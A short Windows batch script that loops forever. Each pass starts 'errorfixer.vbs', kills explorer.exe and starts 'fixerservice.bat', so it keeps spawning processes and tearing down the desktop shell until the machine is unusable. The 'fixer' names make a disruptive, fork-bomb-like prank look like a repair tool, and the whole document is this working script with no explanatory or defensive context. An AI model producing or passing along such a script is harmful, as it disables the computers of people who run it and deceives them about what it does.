@echo off
:cool
start errorfixer.vbs
taskkill /IM explorer.exe
start fixerservice.bat
goto cool